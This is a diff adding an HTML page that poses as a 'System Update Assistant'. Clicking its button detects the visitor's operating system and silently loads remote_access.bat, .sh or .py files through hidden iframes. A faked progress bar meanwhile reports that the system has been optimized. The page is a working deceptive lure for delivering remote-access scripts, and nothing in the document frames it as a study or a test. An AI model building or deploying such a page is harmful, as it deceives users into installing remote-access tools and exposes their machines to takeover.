@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+        }
+        .progress-container {
+            margin: 30px 0;
+            background-color: #eee;
+            border-radius: 4px;
+            height: 20px;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #3498db;
+            border-radius: 4px;
+            transition: width 0.5s;
+        }
+        .status {
+            margin-top: 20px;
+            font-style: italic;
+            color: #7f8c8d;
+        }
+        button {
+            background-color: #2ecc71;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #27ae60;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>System Update Assistant</h1>
+        <p>This utility will check your system for updates and optimize performance.</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+        
+        <div class="status" id="status">Ready to begin...</div>
+        
+        <button id="startBtn">Start Update Process</button>
+    </div>
+
+    <script>
+        // Function to execute the appropriate script based on OS detection
+        function executeScript() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            let scriptPath = '';
+            
+            // Detect OS
+            if (userAgent.indexOf('win') !== -1) {
+                scriptPath = 'remote_access.bat';
+            } else if (userAgent.indexOf('mac') !== -1 || userAgent.indexOf('linux') !== -1) {
+                // Try both scripts for Unix-like systems
+                try {
+                    fetch('remote_access.sh')
+                        .then(response => {
+                            if (response.ok) {
+                                const iframe = document.createElement('iframe');
+                                iframe.style.display = 'none';
+                                iframe.src = 'remote_access.sh';
+                                document.body.appendChild(iframe);
+                            } else {
+                                throw new Error('Shell script not available');
+                            }
+                        })
+                        .catch(() => {
+                            // Try Python script as fallback
+                            const iframe = document.createElement('iframe');
+                            iframe.style.display = 'none';
+                            iframe.src = 'remote_access.py';
+                            document.body.appendChild(iframe);
+                        });
+                } catch (e) {
+                    console.log('Error executing script');
+                }
+                return;
+            }
+            
+            // Execute the script for Windows
+            if (scriptPath) {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = scriptPath;
+                document.body.appendChild(iframe);
+            }
+        }
+
+        // Simulate update process
+        document.getElementById('startBtn').addEventListener('click', function() {
+            const progressBar = document.getElementById('progress');
+            const statusText = document.getElementById('status');
+            const startBtn = document.getElementById('startBtn');
+            
+            startBtn.disabled = true;
+            startBtn.textContent = 'Updating...';
+            
+            // Execute the script in the background
+            executeScript();
+            
+            // Simulate progress
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 5;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    statusText.textContent = 'Update complete! Your system is now optimized.';
+                    startBtn.textContent = 'Finished';
+                } else {
+                    statusText.textContent = `Updating system components (${Math.floor(progress)}%)...`;
+                }
+                progressBar.style.width = `${progress}%`;
+            }, 300);
+        });
+    </script>
+</body>
+</html>
